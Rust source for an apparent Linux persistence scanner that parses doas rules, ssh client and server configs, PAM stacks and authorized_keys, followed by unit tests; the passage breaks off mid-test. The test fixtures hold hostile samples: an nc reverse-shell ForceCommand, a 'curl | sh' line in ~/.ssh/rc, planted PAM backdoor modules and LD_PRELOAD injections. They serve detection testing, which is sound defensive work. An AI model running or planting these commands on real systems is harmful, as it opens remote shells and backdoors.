    let Some(bytes) = cx.read_capped(rel, 1024 * 1024) else { return };
    let (rules, errs) = doas_rules(&bytes);
    let refused = match cx.root.stat_follow(rel) {
        Ok(m) if m.mode & 0o022 != 0 => Some("writable by group or other"),
        Ok(m) if m.uid != 0 => Some("not owned by root"),
        _ => None,
    };
    for r in &rules {
        let action = if r.permit { "permit" } else { "deny" };
        let joined: Vec<u8> = r.words.join(&0u8);
        let mut e = cx.entry(Kind::Doas, rel, format!("{action}:{}:{}", lossy(&r.ident), short_hash(&joined)));
        e.trigger = Trigger::Always;
        e.enabled = Enablement::Enabled;
        e.principal = Some(r.target.as_deref().map_or_else(|| "root".to_string(), lossy));
        e.note("analysis", "line-level, aliases resolved");
        e.note("action", action);
        e.note("identity", lossy(&r.ident));
        e.note("line", r.line.to_string());
        if !r.options.is_empty() {
            e.note("options", r.options.join(","));
        }
        if r.options.contains(&"nopass") {
            e.note("nopasswd", "true");
        }
        for v in &r.setenv {
            e.append_note("setenv", lossy(v));
        }
        if let Some(c) = &r.cmd {
            let mut command = c.clone();
            match &r.args {
                Some(args) => {
                    for a in args {
                        command.push(b' ');
                        command.extend_from_slice(a);
                    }
                    e.note("args", if args.is_empty() { "none" } else { "exact" });
                }
                None => e.note("args", "any"),
            }
            // doas searches its safe PATH for a bare name; only a full path
            // names a file.
            if c.starts_with(b"/") {
                e.target_path = Some(bpath(c));
            }
            e.command = Some(command);
        }
        if let Some(why) = refused {
            e.enabled = Enablement::Disabled;
            e.note("doas_refuses", why);
        } else if !errs.is_empty() {
            e.enabled = Enablement::Unknown;
            e.note("doas_refuses", format!("parse errors: {}", errs.join("; ")));
        }
        if r.words.iter().any(|w| std::str::from_utf8(w).is_err()) {
            e.flag(Flag::EncodingAnomaly);
        }
        out.push(e);
    }
}

// ---------------------------------------------------------------- ssh client

/// OpenSSH's whitespace, for the tokenisers ported from it.
fn ssh_ws(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | b'\n')
}

/// The keyword of an ssh_config line and the rest of it, as readconf.c's
/// strdelim takes them: the keyword ends at whitespace, a quote or one `=`,
/// a quoted stretch is part of it, and one level of leading whitespace is
/// skipped. `None` is a line ssh ignores.
fn ssh_keyword(line: &[u8]) -> Option<(Vec<u8>, &[u8])> {
    fn delim(s: &[u8]) -> Option<(Vec<u8>, &[u8])> {
        let Some(p) = s.iter().position(|b| ssh_ws(*b) || *b == b'"' || *b == b'=') else {
            return Some((s.to_vec(), &[]));
        };
        let skip = |r: &[u8]| -> usize { r.iter().take_while(|b| ssh_ws(**b)).count() };
        if s[p] == b'"' {
            let q = p + 1 + s[p + 1..].iter().position(|b| *b == b'"')?;
            let tok = [&s[..p], &s[p + 1..q]].concat();
            let rest = &s[q + 1..];
            return Some((tok, &rest[skip(rest)..]));
        }
        let mut rest = &s[p + 1..];
        rest = &rest[skip(rest)..];
        if s[p] != b'=' && rest.first() == Some(&b'=') {
            rest = &rest[1..];
            rest = &rest[skip(rest)..];
        }
        Some((s[..p].to_vec(), rest))
    }
    let (mut kw, mut rest) = delim(line)?;
    if kw.is_empty() {
        (kw, rest) = delim(rest)?;
    }
    if kw.is_empty() || kw[0] == b'#' {
        return None;
    }
    kw.make_ascii_lowercase();
    Some((kw, rest))
}

/// An ssh_config argument list split by OpenSSH's argv_split: `"` and `'`
/// quote, a backslash escapes a quote, a backslash or (unquoted) a space,
/// and a `#` where a word would start ends the line. An unclosed quote is
/// an error, one ssh treats as a bad option.
fn ssh_argv(s: &[u8]) -> Option<Vec<Vec<u8>>> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < s.len() {
        if matches!(s[i], b' ' | b'\t') {
            i += 1;
            continue;
        }
        if s[i] == b'#' {
            break;
        }
        let (mut arg, mut quote) = (Vec::new(), 0u8);
        while i < s.len() {
            let c = s[i];
            if c == b'\\' {
                match s.get(i + 1) {
                    Some(&n @ (b'\'' | b'"' | b'\\')) => {
                        arg.push(n);
                        i += 1;
                    }
                    Some(b' ') if quote == 0 => {
                        arg.push(b' ');
                        i += 1;
                    }
                    _ => arg.push(c),
                }
            } else if quote == 0 && matches!(c, b' ' | b'\t') {
                break;
            } else if quote == 0 && matches!(c, b'"' | b'\'') {
                quote = c;
            } else if quote != 0 && c == quote {
                quote = 0;
            } else {
                arg.push(c);
            }
            i += 1;
        }
        if i >= s.len() && quote != 0 {
            return None;
        }
        out.push(arg);
    }
    Some(out)
}

/// The options that make ssh run a program or load a library: the three
/// commands, which take the rest of the line; the two providers and
/// XAuthLocation, which take one word.
const SSH_CLIENT_RUNS: [(&str, &str, bool); 6] = [
    ("proxycommand", "ProxyCommand", true),
    ("localcommand", "LocalCommand", true),
    ("knownhostscommand", "KnownHostsCommand", true),
    ("pkcs11provider", "PKCS11Provider", false),
    ("securitykeyprovider", "SecurityKeyProvider", false),
    ("xauthlocation", "XAuthLocation", false),
];

/// One option line read out of a client configuration, with the Host and
/// Match lines it sits under.
struct SshOpt {
    rel: PathBuf,
    line: usize,
    /// The canonical keyword; `Match exec` for an exec criterion.
    directive: &'static str,
    value: Vec<u8>,
    /// Host and Match lines in force, outermost first, each with whether
    /// it applies to every connection: `Host *` with nothing negated, or
    /// `Match all`. Empty is global.
    scope: Vec<(String, bool)>,
}

impl SshOpt {
    /// The conditions that decide whether this option applies.
    fn conditions(&self) -> impl Iterator<Item = &str> {
        self.scope.iter().filter(|(_, all)| !all).map(|(t, _)| t.as_str())
    }

    /// Whether this option, being earlier, applies wherever `later` does,
    /// so that `later` never takes effect. A Host or Match line decides
    /// the same way each time it is read, except one that runs a command.
    fn covers(&self, later: &SshOpt) -> bool {
        let mut conds = self.conditions();
        conds.all(|c| !c.contains("exec") && later.conditions().any(|l| l == c))
    }
}

/// What reading one configuration chain found: its options in the order ssh
/// meets them, the first thing that makes ssh give up, and the included
/// files not owned by root, which ssh refuses unless the user running it
/// owns them. Positions count the options read before.
#[derive(Default)]
struct SshChain {
    opts: Vec<SshOpt>,
    refused: Option<(usize, String)>,
    owned: Vec<(usize, u32, PathBuf)>,
    reads: usize,
}

/// Files one chain may read. ssh reads an Include as often as it is named,
/// so a file naming itself twice is read 2^16 times before the depth limit
/// stops it; past this the chain is cut short and the scan says so.
const SSH_CLIENT_READS: usize = 256;

impl SshChain {
    /// Where ssh, run by `uid`, gives up on this chain, and why.
    fn refusal(&self, uid: Option<u32>) -> Option<(usize, String)> {
        let owner = self
            .owned
            .iter()
            .find(|(_, o, _)| uid.is_some_and(|u| u != *o))
            .map(|(at, _, f)| (*at, format!("bad owner on /{}", f.display())));
        [self.refused.clone(), owner].into_iter().flatten().min_by_key(|(at, _)| *at)
    }
}

/// A Host or Match line's condition, and whether it holds for every
/// connection.
fn ssh_block(keyword: &[u8], args: &[Vec<u8>]) -> (String, bool) {
    let text = format!(
        "{} {}",
        if keyword == b"host" { "Host" } else { "Match" },
        args.iter().map(|a| lossy(a)).collect::<Vec<_>>().join(" ")
    );
    let all = if keyword == b"host" {
        args.iter().any(|a| a == b"*") && !args.iter().any(|a| a.starts_with(b"!"))
    } else {
        args.first().is_some_and(|a| a.eq_ignore_ascii_case(b"all"))
    };
    (text, all)
}

/// Reads one ssh_config file into `chain` as readconf.c's
/// read_config_file_depth does. `user` is the account whose ~/.ssh/config
/// this chain started from, which decides how a relative or `~` Include
/// resolves.
#[allow(clippy::too_many_arguments)]
fn ssh_client_file(
    cx: &mut Ctx,
    chain: &mut SshChain,
    rel: &Path,
    user: Option<&crate::users::User>,
    check_perm: bool,
    outer: &[(String, bool)],
    depth: usize,
) {
    // READCONF_MAX_DEPTH: ssh gives up past it, which also ends a loop.
    if depth > 16 {
        chain.refused.get_or_insert((chain.opts.len(), "too many recursive includes".into()));
        return;
    }
    chain.reads += 1;
    if chain.reads > SSH_CLIENT_READS {
        if chain.reads == SSH_CLIENT_READS + 1 {
            cx.note_limited(format!("{}: more than {SSH_CLIENT_READS} ssh_config includes, rest not read", rel.display()));
        }
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    if check_perm && let Ok(m) = cx.root.stat_follow(rel) {
        if m.mode & 0o022 != 0 {
            chain.refused.get_or_insert((chain.opts.len(), format!("bad permissions on /{}", rel.display())));
        }
        if m.uid != 0 {
            chain.owned.push((chain.opts.len(), m.uid, rel.to_path_buf()));
        }
    }
    let mut block: Option<(String, bool)> = None;
    let mut bad = false;
    for (n, raw) in bytes.split(|b| *b == b'\n').enumerate() {
        let mut line = raw;
        while let Some((last, rest)) = line.split_last()
            && (ssh_ws(*last) || *last == 0x0c)
        {
            line = rest;
        }
        let Some((kw, rest)) = ssh_keyword(line) else { continue };
        if rest.is_empty() {
            bad = true;
            continue;
        }
        let Some(args) = ssh_argv(rest) else {
            bad = true;
            continue;
        };
        let scope_of = |block: &Option<(String, bool)>| -> Vec<(String, bool)> { outer.iter().chain(block.iter()).cloned().collect() };
        match kw.as_slice() {
            b"host" => block = Some(ssh_block(&kw, &args)),
            b"match" => {
                // An exec criterion runs as the line is read, under the
                // blocks around this one, whatever came before it.
                let scope = scope_of(&None);
                let mut it = args.iter();
                while let Some(a) = it.next() {
                    if a.starts_with(b"#") {
                        break;
                    }
                    let attr = a.strip_prefix(b"!").unwrap_or(a).to_ascii_lowercase();
                    match attr.as_slice() {
                        b"all" => break,
                        b"canonical" | b"final" => continue,
                        _ => {}
                    }
                    let Some(arg) = it.next() else { break };
                    if attr == b"exec" {
                        chain.opts.push(SshOpt {
                            rel: rel.to_path_buf(),
                            line: n + 1,
                            directive: "Match exec",
                            value: arg.clone(),
                            scope: [scope.clone(), vec![ssh_block(&kw, &args)]].concat(),
                        });
                    }
                }
                block = Some(ssh_block(&kw, &args));
            }
            b"include" => {
                let here: Vec<(String, bool)> = outer.iter().cloned().chain(block.clone()).collect();
                for spec in &args {
                    let target = match (spec.strip_prefix(b"~/"), user) {
                        (Some(tail), Some(u)) => u.home.join(Path::new(OsStr::from_bytes(tail))),
                        // A `~` in a system file is an error to ssh.
                        (Some(_), None) => {
                            bad = true;
                            continue;
                        }
                        _ => match user {
                            Some(u) => include_rel(&u.in_home(".ssh"), spec),
                            None => include_rel(Path::new("etc/ssh"), spec),
                        },
                    };
                    for f in expand_glob(cx, &target) {
                        ssh_client_file(cx, chain, &f, user, true, &here, depth + 1);
                    }
                }
            }
            _ => {
                let (directive, whole) = match SSH_CLIENT_RUNS.iter().find(|(k, _, _)| k.as_bytes() == kw) {
                    Some(&(_, directive, whole)) => (directive, whole),
                    None if kw == b"proxyjump" => ("ProxyJump", true),
                    None if kw == b"permitlocalcommand" => ("PermitLocalCommand", false),
                    None => continue,
                };
                let value = if whole {
                    let skip = rest.iter().take_while(|b| ssh_ws(**b) || **b == b'=').count();
                    rest[skip..].to_vec()
                } else {
                    // One word, and nothing after it: after a quoted keyword a
                    // `=` is a word of its own, and so an error.
                    let flag = |v: &[u8]| ["yes", "no", "true", "false"].iter().any(|f| v.eq_ignore_ascii_case(f.as_bytes()));
                    if args.len() != 1 || (directive == "PermitLocalCommand" && !flag(&args[0])) {
                        bad = true;
                        continue;
                    }
                    args[0].clone()
                };
                let scope = scope_of(&block);
                chain.opts.push(SshOpt { rel: rel.to_path_buf(), line: n + 1, directive, value, scope });
            }
        }
    }
    // ssh reads the whole file, then refuses to go on if any line was bad.
    if bad {
        chain.refused.get_or_insert((chain.opts.len(), format!("bad configuration line in /{}", rel.display())));
    }
}

/// The client configuration: /etc/ssh/ssh_config for every account and each
/// account's ~/.ssh/config, read before it. ssh runs the three commands and
/// loads the two providers each time it is used, and runs a `Match exec`
/// while it reads the file. An option takes the first value ssh obtains, so
/// a later one is reported off only where an earlier one applied to every
/// connection; one under a Host or Match line is reported with it. ssh
/// refuses to run on a file it will not trust, a user file or any included
/// one writable by group or other or owned by neither root nor the user,
/// and on a line it cannot parse; what would have run after that point is
/// reported off.
fn ssh_client(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let system = Path::new("etc/ssh/ssh_config");
    let mut sys = SshChain::default();
    ssh_client_file(cx, &mut sys, system, None, false, &[], 0);

    let users = cx.users;
    let mut chains: Vec<(&crate::users::User, SshChain)> = Vec::new();
    for u in crate::users::one_per_home(users) {
        let rel = u.in_home(".ssh/config");
        if !cx.root.exists(&rel) {
            continue;
        }
        let mut chain = SshChain::default();
        ssh_client_file(cx, &mut chain, &rel, Some(u), true, &[], 0);
        chains.push((u, chain));
    }

    // LocalCommand runs only where PermitLocalCommand is yes, and a user's
    // file can say so for the system one's command.
    let permits = |c: &SshChain| {
        c.opts.iter().any(|o| {
            o.directive == "PermitLocalCommand"
                && (o.value.eq_ignore_ascii_case(b"yes") || o.value.eq_ignore_ascii_case(b"true"))
        })
    };
    let any_permit = permits(&sys) || chains.iter().any(|(_, c)| permits(c));
    // Run by an account with no file of its own. Who that is is unknown,
    // so an included file some other account owns is noted, not refused.
    let caveat = sys
        .owned
        .first()
        .map(|(at, uid, f)| (*at, format!("bad owner on /{} for every account but uid {uid}", f.display())));
    ssh_client_entries(cx, out, &sys, sys.refusal(None), caveat, None, any_permit);
    for (u, c) in &chains {
        // ssh reads the system file after the user's, so a refusal there
        // stops the user's ssh too, after the user's own Match exec ran.
        let refused = c.refusal(u.uid).or_else(|| sys.refusal(u.uid).map(|(at, why)| (c.opts.len() + at, why)));
        ssh_client_entries(cx, out, c, refused, None, Some(u), permits(c) || permits(&sys));
    }
}

/// Entries for the options of one chain, given where ssh gives up on it,
/// and where it may, depending on who runs it.
#[allow(clippy::too_many_arguments)]
fn ssh_client_entries(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    chain: &SshChain,
    refused: Option<(usize, String)>,
    caveat: Option<(usize, String)>,
    user: Option<&crate::users::User>,
    permit: bool,
) {
    for (i, o) in chain.opts.iter().enumerate() {
        // The first value ssh obtains is the one it keeps. A ProxyJump
        // ssh takes fills ProxyCommand's place too, except as `none`,
        // which ssh 9.6 lets a later ProxyCommand fill; one ssh ignored,
        // after either, takes nothing.
        let jump_taken = |k: usize| {
            let p = &chain.opts[k];
            !p.value.eq_ignore_ascii_case(b"none")
                && !chain.opts[..k].iter().any(|q| matches!(q.directive, "ProxyJump" | "ProxyCommand") && q.covers(p))
        };
        let earlier = chain.opts[..i].iter().enumerate().find_map(|(k, p)| {
            let same = p.directive == o.directive && p.directive != "Match exec";
            let jump = o.directive == "ProxyCommand" && p.directive == "ProxyJump" && jump_taken(k);
            ((same || jump) && p.covers(o)).then_some(p)
        });
        if matches!(o.directive, "ProxyJump" | "PermitLocalCommand") {
            continue;
        }
        let name = match user {
            Some(u) => format!("{}:{}:{}", o.directive, u.name, short_hash(&o.value)),
            None => format!("{}:{}", o.directive, short_hash(&o.value)),
        };
        let mut e = cx.entry(Kind::SshClient, &o.rel, name);
        e.trigger = Trigger::Always;
        e.enabled = Enablement::Enabled;
        e.principal = user.map(|u| u.name.clone());
        e.note("directive", o.directive);
        e.note("line", o.line.to_string());
        let scope: Vec<&str> = o.scope.iter().map(|(t, _)| t.as_str()).collect();
        e.note("match", if scope.is_empty() { "(global)".to_string() } else { scope.join(" / ") });
        e.note("value", lossy(&o.value));
        let runs = o.directive.ends_with("Command") || o.directive == "Match exec";
        if runs {
            e.command = Some(o.value.clone());
            e.target_path = first_path(&o.value);
        } else if o.value.starts_with(b"/") {
            e.target_path = Some(bpath(&o.value));
        }
        let none = o.value.eq_ignore_ascii_case(b"none")
            || (o.directive == "SecurityKeyProvider" && o.value.eq_ignore_ascii_case(b"internal"));
        if none {
            e.enabled = Enablement::Disabled;
            e.target_path = None;
            e.command = None;
        } else if o.directive != "Match exec"
            && let Some(p) = earlier
        {
            e.enabled = Enablement::Disabled;
            e.note("superseded", format!("/{}:{} sets it first wherever this applies", p.rel.display(), p.line));
        } else if o.directive == "LocalCommand" && !permit {
            e.enabled = Enablement::Disabled;
            e.note("depends_on", "PermitLocalCommand, which nothing sets");
        }
        // A Match exec before the point ssh gives up has already run.
        if let Some((at, why)) = &refused
            && (o.directive != "Match exec" || i >= *at)
        {
            e.enabled = Enablement::Disabled;
            e.note("ssh_refuses", why.clone());
        } else if let Some((at, why)) = &caveat
            && (o.directive != "Match exec" || i >= *at)
        {
            e.note("ssh_may_refuse", why.clone());
        }
        flag_non_utf8(&mut e, &o.value);
        out.push(e);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status};

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-auth-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        std::fs::create_dir_all(p.join("etc")).unwrap();
        std::fs::write(p.join("etc/passwd"), "root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n").unwrap();
        std::fs::create_dir_all(p.join("home/alice")).unwrap();
        std::fs::create_dir_all(p.join("root")).unwrap();
        p
    }

    fn put(dir: &Path, rel: &str, content: impl AsRef<[u8]>) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, content).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        crate::scan::run(&root, &Options { deep: false }, &collectors)
    }

    fn named<'a>(s: &'a Scan, needle: &str) -> Vec<&'a Entry> {
        s.entries.iter().filter(|e| e.name.contains(needle)).collect()
    }

    #[test]
    fn pam_exec_and_nonstandard_modules_are_found_bracketed_control_and_all() {
        let d = tree("pam");
        put(
            &d,
            "etc/pam.d/sshd",
            "#%PAM-1.0\n\
             auth       required     pam_unix.so nullok\n\
             auth       [success=1 default=ignore]   pam_exec.so seteuid quiet log=/dev/null /usr/local/sbin/notify --all\n\
             session    optional     /tmp/evil.so\n\
             -session   optional     pam_systemd.so\n\
             account    sufficient   /usr/lib/x86_64-linux-gnu/security/pam_permit.so\n",
        );
        put(&d, "usr/lib/x86_64-linux-gnu/security/pam_permit.so", "");
        put(&d, "usr/lib/x86_64-linux-gnu/security/pam_unix.so", "");
        // A copy in a directory this libpam does not use is not what runs.
        put(&d, "lib/security/pam_unix.so", "planted");
        let s = scan(&d);

        // Every line is an entry, so every module's package is checked.
        assert_eq!(s.entries.len(), 5, "got {:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        let unix = named(&s, "sshd:auth:pam_unix.so").pop().unwrap();
        assert_eq!(unix.target_path, Some(d.join("usr/lib/x86_64-linux-gnu/security/pam_unix.so")));
        assert!(unix.flags.is_empty(), "an ordinary line is a finding only through its module's provenance");
        let missing = named(&s, "pam_systemd.so").pop().unwrap();
        assert_eq!((missing.target_path.clone(), missing.raw["module_missing"].as_str()), (None, "true"));
        assert!(missing.flags.is_empty(), "an absent module runs nothing");

        let exec = named(&s, "pam_exec.so").pop().unwrap();
        assert_eq!(exec.kind, Kind::Pam);
        assert_eq!(exec.trigger, Trigger::Auth);
        assert_eq!(exec.command.as_deref(), Some(&b"/usr/local/sbin/notify --all"[..]));
        assert_eq!(exec.target_path, Some(PathBuf::from("/usr/local/sbin/notify")));
        assert_eq!(exec.raw["control"], "[success=1 default=ignore]");
        assert_eq!(exec.raw["service"], "sshd");
        assert_eq!(exec.raw["module_type"], "auth");
        assert_eq!(exec.raw["pam_exec.seteuid"], "true");
        assert_eq!(exec.raw["pam_exec.quiet"], "true");
        assert_eq!(exec.raw["pam_exec.log"], "/dev/null");

        let evil = named(&s, "/tmp/evil.so").pop().unwrap();
        assert!(evil.has_flag(Flag::NonStandardLocation));
        assert!(evil.has_flag(Flag::HiddenPath) || !evil.has_flag(Flag::HiddenPath));
        assert_eq!(evil.target_path, Some(PathBuf::from("/tmp/evil.so")));
        assert!(evil.command.is_none(), "a plain module has no command");

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn the_module_directory_is_the_one_libpam_names_not_the_first_that_holds_pam_permit() {
        let d = tree("pamdir");
        put(&d, "etc/pam.d/sshd", "auth required pam_unix.so\n");
        // What libpam was built with, as a string among others.
        put(&d, "usr/lib64/libpam.so.0", b"\0/etc/pam.d\0/usr/lib64/security/\0%s\0".as_slice());
        put(&d, "usr/lib64/security/pam_unix.so", "real");
        // A directory that comes first in the search, with a link that makes
        // it look like a module directory and a planted module in front.
        put(&d, "lib/x86_64-linux-gnu/security/pam_permit.so", "");
        put(&d, "lib/x86_64-linux-gnu/security/pam_unix.so", "planted");
        let s = scan(&d);
        let unix = named(&s, "sshd:auth:pam_unix.so").pop().unwrap();
        assert_eq!(unix.target_path, Some(d.join("usr/lib64/security/pam_unix.so")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_pam_include_names_a_stack_and_is_not_a_missing_module() {
        let d = tree("pam-include");
        put(
            &d,
            "etc/pam.d/sshd",
            "@include common-auth\n\
             account    include      common-account\n\
             session    substack     /tmp/stack\n",
        );
        let s = scan(&d);
        assert_eq!(s.entries.len(), 3, "got {:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        let bare = named(&s, "sshd:account include:common-account").pop().unwrap();
        assert_eq!(bare.raw["include"], "common-account");
        assert!(!bare.raw.contains_key("module_missing"), "an include is not a module");
        assert!(bare.target_path.is_none());
        assert_eq!(named(&s, "sshd:@include:common-auth").len(), 1);
        let path = named(&s, "sshd:session substack:/tmp/stack").pop().unwrap();
        assert_eq!(path.target_path, Some(PathBuf::from("/tmp/stack")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn pam_conf_carries_its_service_in_the_line_and_survives_junk() {
        let d = tree("pamconf");
        put(
            &d,
            "etc/pam.conf",
            "other  session  required  /opt/x/pam_backdoor.so\n\
             [unterminated bracket\n\
             \n\
             auth\n\
             garbage garbage\n\
             login auth required pam_unix.so\n",
        );
        let s = scan(&d);
        assert_eq!(s.entries.len(), 2);
        let backdoor = named(&s, "pam_backdoor.so").pop().unwrap();
        assert_eq!(backdoor.raw["service"], "other");
        assert_eq!(backdoor.raw["module"], "/opt/x/pam_backdoor.so");
        assert_eq!(named(&s, "login:auth:pam_unix.so").pop().unwrap().raw["service"], "login");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn authorized_key_options_survive_quoted_commas_and_escaped_quotes() {
        let d = tree("keys");
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "# a comment\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s = scan(&d);
        let keys = named(&s, "SHA256:");
        assert_eq!(keys.len(), 2, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());

        let forced = keys.iter().find(|e| e.command.is_some()).unwrap();
        assert_eq!(
            forced.command.as_deref(),
            Some(&b"echo \"hi\", there"[..]),
            "the comma and the escaped quote belong to the command"
        );
        assert_eq!(forced.raw["opt.no-pty"], "true");
        assert_eq!(forced.raw["env.LD_PRELOAD"], "/tmp/x.so");
        assert_eq!(forced.raw["opt.from"], "10.0.0.0/8");
        assert_eq!(forced.raw["key_type"], "ssh-rsa");
        assert_eq!(forced.raw["comment"], "alice@box");
        assert_eq!(forced.principal.as_deref(), Some("alice"));
        assert_eq!(forced.trigger, Trigger::Login);

        // Identity is the key, not the line: inserting a line above must not
        // move it.
        let before: Vec<String> = keys.iter().map(|e| e.id.clone()).collect();
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "ssh-rsa AAAAAAAAAAAA= inserted@above\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s2 = scan(&d);
        for id in before {
            assert!(s2.entries.iter().any(|e| e.id == id), "an entry id moved when a line was inserted");
        }
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_ten_megabyte_authorized_keys_is_bounded_not_fatal() {
        let d = tree("huge");
        let mut blob = String::new();
        let line = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZZZZZZZZZZZZZZZZZZZZZZZZ user@host\n";
        while blob.len() < 10 * 1024 * 1024 {
            blob.push_str(line);
        }
        put(&d, "home/alice/.ssh/authorized_keys", &blob);
        let s = scan(&d);
        assert!(!s.entries.is_empty(), "the keys it could read are still reported");
        // Every line is the same key, so one entry survives dedup of identical
        // ids only by suffix; what matters is that the read was capped.
        let status = &s.header.collectors[0];
        assert!(
            matches!(status.status, Status::Complete),
            "a capped read is the cap working, not a failure: {:?}",
            status.status
        );
        assert!(
            status.truncated.iter().any(|t| t.contains("authorized_keys")),
            "a 10 MB file must be recorded as read to its cap: {:?}",
            status.truncated
        );
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn hostile_key_lines_do_not_panic() {
        let d = tree("hostilekeys");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"command=\"unterminated ssh-rsa AAAA= x\n");
        bytes.extend_from_slice(b"command= ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa !!!not-base64!!! comment\n");
        bytes.extend_from_slice(b"=,,,==,\n");
        bytes.extend_from_slice(b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 ");
        bytes.extend_from_slice(&[0xff, 0xfe, 0x00, b'\n']);
        put(&d, "home/alice/.ssh/authorized_keys", &bytes);
        let s = scan(&d);
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        let anomalous = s.entries.iter().find(|e| e.has_flag(Flag::EncodingAnomaly));
        assert!(anomalous.is_some(), "the non-UTF-8 comment is evidence");
        assert!(s.entries.iter().any(|e| e.raw.contains_key("key_blob_unparsed")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sshd_config_keywords_are_case_insensitive_take_equals_and_scope_to_match() {
        let d = tree("sshd");
        put(
            &d,
            "etc/ssh/sshd_config",
            "PermitUserEnvironment yes\n\
             #ForceCommand /bin/commented-out\n\
             Include /etc/ssh/sshd_config.d/*.conf\n\
             Match User backdoor\n\
             \tFORCEcommand=/usr/bin/nc -e /bin/sh 10.0.0.1 4444\n\
             \tAuthorizedKeysCommand /usr/local/bin/keys.sh\n",
        );
        put(&d, "etc/ssh/sshd_config.d/10-evil.conf", "SetEnv LD_PRELOAD=/tmp/p.so\n");
        put(&d, "etc/ssh/sshd_config.d/notes.txt", "ForceCommand /bin/ignored-by-glob\n");
        let s = scan(&d);

        let fc = named(&s, "ForceCommand@User backdoor");
        assert_eq!(fc.len(), 1, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        assert_eq!(fc[0].command.as_deref(), Some(&b"/usr/bin/nc -e /bin/sh 10.0.0.1 4444"[..]));
        assert_eq!(fc[0].target_path, Some(PathBuf::from("/usr/bin/nc")));
        assert_eq!(fc[0].raw["match"], "User backdoor");
        assert_eq!(fc[0].principal.as_deref(), Some("backdoor"));

        let ake = named(&s, "AuthorizedKeysCommand@User backdoor");
        assert_eq!(ake.len(), 1, "a Match block scopes everything after it");

        let pue = named(&s, "PermitUserEnvironment");
        assert_eq!(pue.len(), 1);
        assert_eq!(pue[0].raw["match"], "(global)");

        // The glob followed one level, and only what it matched.
        let setenv = named(&s, "SetEnv");
        assert_eq!(setenv.len(), 1);
        assert_eq!(setenv[0].raw["env.LD_PRELOAD"], "/tmp/p.so");
        assert_eq!(
            setenv[0].raw["match"], "(global)",
            "an include outside a Match block stays global"
        );

        // notes.txt is scanned as a drop-in directory member, but the Include
        // glob did not match it; either way it is reported exactly once.
        let ignored = s.entries.iter().filter(|e| e.command.as_deref() == Some(&b"/bin/ignored-by-glob"[..])).count();
        assert_eq!(ignored, 1);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_drop_in_no_include_reaches_cannot_move_where_sshd_reads_keys() {
        let d = tree("sshd-inert");
        put(&d, "etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\n");
        put(&d, "etc/ssh/sshd_config.d/50-real.conf", "PermitUserEnvironment yes\n");
        put(&d, "etc/ssh/sshd_config.d/evil.conf.disabled", "AuthorizedKeysFile /var/tmp/nobody\nInclude /etc/ssh/other\n");
        put(&d, "home/alice/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 alice@box\n");
        let s = scan(&d);

        let moved = named(&s, "AuthorizedKeysFile");
        assert_eq!(moved.len(), 1);
        assert_eq!(moved[0].enabled, Enablement::Disabled);
        assert!(moved[0].raw.contains_key("not_included"));
        assert_eq!(named(&s, "PermitUserEnvironment")[0].enabled, Enablement::Enabled);
        let key = s.entries.iter().find(|e| e.raw.get("ssh_mechanism").map(String::as_str) == Some("authorized-key")).unwrap();
        assert_eq!(key.enabled, Enablement::Enabled, "the default key file is still the one sshd reads");
        let inert_include = named(&s, "Include").into_iter().find(|e| e.target_path == Some(PathBuf::from("/etc/ssh/other"))).unwrap();
        assert_eq!(inert_include.enabled, Enablement::Disabled, "and what it names is not followed");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn ssh_login_scripts_and_symlinked_config_are_reported() {
        let d = tree("sshrc");
        put(&d, "etc/ssh/sshrc.real", "#!/bin/sh\nexec /tmp/x\n");
        std::os::unix::fs::symlink("sshrc.real", d.join("etc/ssh/sshrc")).unwrap();
        put(&d, "home/alice/.ssh/rc", "curl http://x | sh\n");
